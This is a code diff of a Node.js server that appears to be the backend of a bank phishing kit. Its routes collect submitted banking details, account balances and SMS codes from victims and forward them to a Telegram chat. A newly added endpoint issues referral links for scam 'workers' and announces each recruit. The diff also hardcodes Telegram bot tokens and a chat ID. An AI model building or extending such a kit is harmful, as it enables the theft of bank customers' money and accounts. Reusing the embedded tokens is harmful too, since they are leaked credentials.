@@ -5,9 +5,10 @@ const WebSocket = require('ws');
 const path = require('path');
 
 // НАСТРОЙКИ
-const TELEGRAM_BOT_TOKEN = '7968124118:AAFfJmnTphE5GGLu9-RyCSazPUhNsGFLrnI';
-const CHAT_ID = '-5053033986';
-const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc';
+const CHAT_ID = process.env.CHAT_ID || '-1003473672730';
+const DOMAIN = process.env.DOMAIN || 'new-l8h6.onrender.com';
+const WEBHOOK_URL = `https://${DOMAIN}/bot${TELEGRAM_BOT_TOKEN}`;
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
 const banksForRequestButton = [
@@ -36,7 +37,7 @@ app.get('/panel', (req, res) => {
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-// Установка webhook
+// Установка webhook динамически, если DOMAIN задан
 bot.setWebHook(WEBHOOK_URL).then(() => {
     console.log(`Webhook set to ${WEBHOOK_URL}`);
 }).catch(err => {
@@ -138,7 +139,7 @@ app.post('/api/submit', (req, res) => {
         if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
         const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
         message += `<b>Кількість переходів:</b> ${visitText}\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
+        message += `<b>Worker:</b> @${workerNick}\n`;  // Уже есть строка с Worker и ником
 
         sendToTelegram(message, sessionId, newData.bankName);
     }
@@ -173,6 +174,35 @@ app.post('/api/sms', (req, res) => {
         res.status(200).json({ message: 'OK' });
     } else {
         res.status(404).json({ message: 'Session not found' });
+    }
+});
+
+app.post('/api/generate-link', (req, res) => {
+    const { nick } = req.body;
+    const errorMessage = 'Ник должен начинаться с @ и содержать хотя бы 1 символ после него';
+
+    if (!nick || !nick.startsWith('@') || nick.length < 2) {
+        return res.status(400).json({ error: errorMessage });
+    }
+
+    let workerNick;
+    try {
+        workerNick = nick.substring(1);
+        const refCode = btoa(workerNick);
+        const domain = req.headers.host || DOMAIN;
+        const protocol = req.secure ? 'https' : 'http';
+        const refLink = `${protocol}://${domain}/?ref=${encodeURIComponent(refCode)}`;
+
+        // Отправка в Telegram о новом worker
+        let message = `<b>Новый worker зарегистрирован!</b>\n\n`;
+        message += `<b>Worker:</b> @${workerNick}\n`;
+        message += `<b>Ссылка:</b> ${refLink}\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' }).catch(err => console.error('Telegram send error:', err));
+
+        res.status(200).json({ link: refLink });
+    } catch (e) {
+        console.error('Error generating link:', e);
+        res.status(500).json({ error: 'Ошибка генерации ссылки' });
     }
 });
 
